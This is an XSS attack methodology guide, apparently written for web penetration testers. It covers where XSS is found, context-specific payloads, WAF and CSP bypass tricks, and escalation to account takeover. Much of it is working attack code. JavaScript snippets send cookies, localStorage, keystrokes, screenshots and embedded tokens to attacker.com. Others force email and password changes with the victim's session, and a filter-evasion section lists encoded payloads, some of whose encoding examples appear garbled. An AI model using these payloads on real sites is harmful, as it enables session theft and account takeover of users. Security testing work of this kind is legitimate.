# XSS Methodology

Not a payload list. This covers how to find XSS, what to do when a WAF is blocking, how to escalate past `alert(1)`, and how to chain it into full account takeover.

---

## Where XSS is Commonly Found

Not every input field is equal. These are the places that actually yield XSS in real apps.

**Search bars** - query parameter reflected in the page ("Results for: INJECT"). One of the most common. Easy to spot, often unsanitised because devs assume search is read-only.

**Error messages** - "Invalid input: INJECT" or "User INJECT not found." App reflects your input back in a validation message. Often missed in testing because testers don't read error copy.

**Redirect parameters** - `?next=/dashboard` or `?returnUrl=INJECT`. Value gets written into a link or a `<script>` redirect. Frequently DOM XSS via `location.href = params.next`.

**Profile fields** - username, bio, display name. Stored XSS. If it renders on other users' pages (public profile, comments section, admin user list), it's high impact. Admin panels that show user-submitted data are the jackpot.

**Comment / review sections** - classic stored XSS. Input is written once and displayed to many. Check if Markdown or HTML is allowed - parsers frequently have bypasses.

**File upload filenames** - upload `<img src=x onerror=alert(1)>.jpg`. The filename gets reflected in a success message, an error, or a listing page. App often doesn't sanitise it because it's "just a filename."

**HTTP headers reflected in responses** - `User-Agent` and `Referer` commonly appear in analytics dashboards, error pages, or log viewers. Stored blind XSS if a staff member views the logs.

**Custom 404 / error pages** - `/path/INJECT` reflected in "Page not found: /path/INJECT". Low-hanging fruit, often not sanitised.

**Mailto and tel links** - `<a href="mailto:INJECT">`. If the app builds the href from user input, `javascript:` can slip in.

**WebSocket messages** - app echoes messages back into the DOM. DOM XSS via WebSocket payload. Less common but testers often skip it entirely.

**Import / export features** - CSV, XML, or JSON files uploaded by users and then displayed. If the app renders the imported field values in HTML, stored XSS via file content.

**PDF / report generators** - user-controlled input (name, address, description) gets rendered to PDF via headless Chrome or wkhtmltopdf. Often leads to blind XSS or SSRF depending on the renderer.

**Third-party integrations** - app pulls data from an external source (RSS feed, API, OAuth profile name) and renders it unsanitised. XSS in a field that comes from outside your trust boundary.

---

## Finding XSS

### Reflection points to test

Before throwing payloads, map where input gets reflected:

- URL path segments: `/search/INJECT`
- Query parameters: `?q=INJECT&page=1`
- Fragment: `#INJECT` (client-side only, never reaches server)
- Form fields: text, hidden, email, number inputs
- HTTP headers reflected in response: `Referer`, `User-Agent`, custom headers
- JSON body fields echoed back
- File upload filenames (reflected in error messages, download links)
- WebSocket messages
- postMessage handlers
- `document.location`, `document.cookie`, `window.name` read by scripts

The fragment is important because it only processes client-side. SPAs frequently use fragment routing and client-side JS parses `location.hash` - that's a source for DOM XSS.

### Reflection context quick reference

| Context | Example | Escape char | Payload |
|---------|---------|-------------|---------|
| HTML (between tags) | `<p>INJECT</p>` | none | `<img src=x onerror=alert(1)>` |
| HTML attr, unquoted | `<input value=INJECT>` | space | `x onclick=alert(1)` |
| HTML attr, single-quoted | `<input value='INJECT'>` | `'` | `'><script>alert(1)</script>` or `' onclick='alert(1)` |
| HTML attr, double-quoted | `<input value="INJECT">` | `"` | `"><script>alert(1)</script>` or `" onclick="alert(1)` |
| JS string, single-quoted | `var x = 'INJECT';` | `'` | `';alert(1)//` or `\';alert(1)//` if quotes are backslash-escaped |
| JS string, double-quoted | `var x = "INJECT";` | `"` | `";alert(1)//` |
| JS template literal | `` var x = `INJECT`; `` | none | `${alert(1)}` |
| URL attribute | `<a href="INJECT">` | none needed | `javascript:alert(1)` |
| JSON in script block | `var x = {"k":"INJECT"};` | `"` | `"}; alert(1); //` |

For HTML attributes the pattern is always: escape quote -> close tag -> inject new tag, or escape quote -> add event handler and stay in tag. The only variable is which quote character to use.

### DOM XSS sources and sinks

DOM XSS doesn't require server reflection. The payload travels through the DOM.

**Common sources (attacker-controlled)**
- `document.location` / `location.href` / `location.search` / `location.hash`
- `document.referrer`
- `document.cookie`
- `window.name`
- postMessage data
- localStorage / sessionStorage (if previously poisoned)

**Common sinks (dangerous functions)**
- `innerHTML = ` / `outerHTML = `
- `document.write()` / `document.writeln()`
- `eval()`
- `setTimeout(string)` / `setInterval(string)`
- `new Function(string)`
- `element.src = ` (in some contexts)
- jQuery: `.html()`, `.append()`, `.after()`, `$()` with attacker input
- `location.href = ` (for open redirect → XSS with `javascript:`)

To find DOM XSS: grep source for these sinks, trace backwards to see what feeds them. Burp's DOM Invader automates this - it injects canary strings across all sources and watches which sinks receive them.

### Blind XSS

Blind XSS fires in an admin panel, logging system, or backend tool you can't see directly.

Payloads load a remote script, exfiltrate the page:
```html
<script src="https://xsshunter.com/YOURTOKEN"></script>
```

Targets:
- Support ticket systems (staff read your input)
- Log viewers (error messages, user agents, form input logged)
- Admin panels that display user data
- PDF generators fed by user input
- Email preview in webmail

Blind XSS tools: XSS Hunter, Caido's blind XSS, self-hosted burp collaborator-style callback.

---

## WAF Bypass

WAFs block based on signatures. The goal is to reach the sink without triggering the signature.

### Encoding tricks

```
<script>alert(1)</script>           # blocked
<script>alert(1)</script>           # double encode - blocked at decoding
%3Cscript%3E                        # single URL encode
<script>                  # unicode escape (works in JS strings)
&#60;script&#62;                    # HTML entity (works in HTML context)
&#x3C;script&#x3E;                  # hex entity
```

Note: encoding only works where the browser decodes it. URL encoding in HTML attribute context gets decoded by the browser before parsing.

### Case variation
```
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</sCrIpT>
```

### Alternative tags

If `<script>` is blocked:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<math><maction actiontype="statusline#x" xlink:href="javascript:alert(1)">click
```

### Alternative event handlers

If `onerror`, `onload` are filtered:
```
onmouseover, onclick, ondblclick, onkeydown, onkeyup, onfocus,
onblur, onchange, onsubmit, onreset, ontoggle, onscroll, ondrag,
onanimationend, ontransitionend, onpointerover
```

### Breaking up the payload

WAFs match strings like `onerror=`, `alert(`, `script`:
```html
<img src=x onerror="alert(1)">     # unicode in string
<img src=x onerror="al"+"ert(1)">       # concatenation (eval context)
<img src=x onerror="alert(1)">
<script>window['al'+'ert'](1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>   # base64
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### Whitespace and comment injection

Inside script tags, JS tolerates a lot:
```javascript
alert/*comment*/(1)
alert (1)                         # space before parens
alert`1`                          # template literal, no parens needed
```

HTML comment inside script tags (old IE trick, mostly dead):
```html
<script><!--
alert(1)
//--></script>
```

Null bytes can sometimes split WAF pattern matching:
```
<scr\x00ipt>
```

### Mutation XSS (mXSS)

The browser's HTML parser is more permissive than the WAF's parser. If the WAF sanitises via server-side regex but the browser re-parses and mutates the output, the sanitised input becomes XSS.

Classic: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` - browsers with scripting disabled parse this differently.

This is application/context specific. DOMPurify has had several mXSS CVEs. Worth testing if there's a sanitiser in use.

### Content-Type confusion

If the server responds with `Content-Type: text/html` but the response is actually JSON or XML, browsers might still parse it as HTML. If an endpoint mirrors `callback=INJECT` in a JSONP response, test for XSS even if content type is `application/javascript`.

### Filter bypass reference

| Blocked pattern | Alternative |
|----------------|-------------|
| `alert` | `prompt`, `confirm`, `console.log`, `eval('alert(1)')` |
| `(1)` | `` `1` `` (template literal call) |
| `<script>` | `<img onerror=...>`, `<svg onload=...>` |
| `onerror` | `onload`, `onfocus`, `ontoggle` |
| `javascript:` | `JaVaScRiPt:`, `java\tscript:`, `javascript\n:` |
| `document.cookie` | `document['cookie']`, `window.document.cookie` |
| Double quotes | Single quotes, backticks |
| Angle brackets | Depends on context - encoding |

---

## Escalating Past alert(1)

Proving XSS fires is step one. The actual impact is what matters.

### What you can actually do

**Read page content**
```javascript
fetch('https://attacker.com/?d=' + btoa(document.body.innerHTML))
```

**Steal session cookies** (if not HttpOnly)
```javascript
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie)
```

**Exfiltrate localStorage**
```javascript
let data = JSON.stringify(localStorage);
fetch('https://attacker.com/exfil', {method:'POST', body:data})
```

**Keylogger**
```javascript
document.addEventListener('keydown', function(e) {
  fetch('https://attacker.com/k?k=' + e.key)
})
```

**Screenshot via html2canvas**
```javascript
// Load html2canvas, then:
html2canvas(document.body).then(canvas => {
  fetch('https://attacker.com/ss', {method:'POST', body: canvas.toDataURL()})
})
```

**Port scan the internal network**
```javascript
// For each IP:port of interest
var img = new Image();
img.onerror = function() { /* port responded */ }
img.src = 'http://192.168.1.1:8080/';
```

**Force actions on behalf of user**
```javascript
// CSRF via XSS - XSS bypasses SameSite cookies since same origin
fetch('/api/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
})
```

This is the key point: **XSS bypasses CSRF protection entirely** because the request originates from the victim's own browser on the same origin. `SameSite=Strict` doesn't protect against XSS.

**Read CSRF tokens from the DOM**
```javascript
let token = document.querySelector('[name="csrf_token"]').value
// Use it in a subsequent forged request
```

---

## Chaining to Account Takeover

XSS → account takeover is one of the most reliable chains in web bugs.

### Path 1: Session hijack

Requires cookies not marked HttpOnly.

```javascript
document.location = 'https://attacker.com/steal?c=' + document.cookie
```

Attacker sets cookie in their browser, authenticates as victim. Done.

If HttpOnly is set, cookies can't be read from JS. Need another path.

### Path 2: Change email/password via authenticated request

The victim is already authenticated. Use XSS to make state-changing requests from their session.

```javascript
// Step 1: Get CSRF token if needed
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    let parser = new DOMParser();
    let doc = parser.parseFromString(html, 'text/html');
    let csrf = doc.querySelector('[name="csrf_token"]').value;

    // Step 2: Submit email change
    return fetch('/account/email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=attacker%40evil.com&csrf_token=' + csrf,
      credentials: 'include'
    });
  })
```

Once email is changed: trigger password reset to attacker's email. ATO complete.

### Path 3: Password change with no current password required

Some applications allow changing password without entering the current one (if already logged in). XSS can submit this form directly.

```javascript
fetch('/account/password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({password: 'AttackerControlled1!', password_confirm: 'AttackerControlled1!'}),
  credentials: 'include'
})
```

### Path 4: Token leakage via navigation

Some apps embed auth tokens in the DOM or JavaScript:

```javascript
// Look for these patterns in the page
document.querySelectorAll('script').forEach(s => {
  if (s.innerText.includes('token') || s.innerText.includes('apiKey')) {
    fetch('https://attacker.com/exfil?t=' + btoa(s.innerText))
  }
})

// Or window variables
let keys = Object.keys(window).filter(k => k.toLowerCase().includes('token') || k.toLowerCase().includes('key'))
fetch('https://attacker.com/exfil?d=' + btoa(JSON.stringify(keys.map(k => [k, window[k]]))))
```

### Path 5: OAuth flow hijack via XSS

If the application uses OAuth and the redirect_uri or state can be influenced via XSS:

XSS on the client → trigger OAuth flow with attacker-controlled `redirect_uri` → steal auth code → exchange for access token.

More complex but high impact if the OAuth grant includes sensitive scopes.

### Path 6: SSO/SAML token extraction

If a SAML assertion or SSO token is present in the DOM or localStorage after login:

```javascript
fetch('https://attacker.com/exfil?t=' + btoa(localStorage.getItem('sso_token')))
```

Replaying this token elsewhere completes ATO.

---

## Stored vs Reflected vs DOM

**Stored XSS** - payload is persisted server-side and displayed to other users. Highest impact. No need for victim to click a link. If it fires in an admin panel: instant privilege escalation.

**Reflected XSS** - payload in the request, reflected immediately in the response. Requires victim to click a crafted link. Still achieves ATO with the paths above but requires phishing/link delivery.

**DOM XSS** - payload is never sent to the server. Client-side JavaScript reads attacker-controlled data and writes it to a dangerous sink. Tools like Burp's DOM Invader find these. Often harder to detect with passive scanning.

---

## Delivery and Context

### CSP bypass

If CSP is in place, check:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

- Is there a whitelisted CDN that allows arbitrary file uploads? Upload a `.js` file to the CDN, call it from XSS.
- Is `unsafe-inline` present? Inline scripts work.
- Is `unsafe-eval` present? `eval()` works.
- Is `strict-dynamic` absent? Old-style whitelist bypasses work.
- Angular CSP bypass: if Angular is loaded, `ng-app` attribute + expression injection bypasses script restrictions.
- Google/CDN bypasses: `https://www.google.com/jsapi` historically allowed script execution.

Check CSP at: https://csp-evaluator.withgoogle.com/

### When XSS is in a sandboxed iframe

If the vulnerable page loads inside a sandboxed `<iframe>` (`sandbox` attribute), capabilities are restricted. Check exactly what's allowed:

```
sandbox="allow-scripts allow-same-origin"
```

- `allow-same-origin` + `allow-scripts` = can escape iframe via `parent.document`
- Without `allow-same-origin`: origin is null, can't access parent
- Without `allow-forms`: can't submit forms
- Can still exfiltrate via `fetch()` if `allow-scripts` is present

### Self-XSS → ATO via CSRF

Self-XSS fires only in the victim's own browser (e.g., they have to paste into the console). Can still be exploited if combined with CSRF:

1. Find CSRF vulnerability that changes stored data the self-XSS fires on
2. Victim visits attacker page
3. CSRF request updates victim's data with XSS payload
4. Victim navigates to vulnerable page → XSS fires

---

## Testing Checklist

- [ ] Map all reflection points before throwing payloads
- [ ] Identify context (HTML, attribute, JS string, URL, DOM)
- [ ] Test DOM sources: `location.hash`, `location.search`, `document.referrer`, postMessage
- [ ] Check for blind XSS candidates: support forms, user agents, file upload filenames
- [ ] If WAF blocks, try encoding, alternative tags, event handlers, template literals
- [ ] Confirm HttpOnly status of session cookies
- [ ] Escalate: attempt email change, password change, token extraction
- [ ] Check CSP before concluding impact
- [ ] For stored XSS: check if it fires in admin context (escalation to privilege)
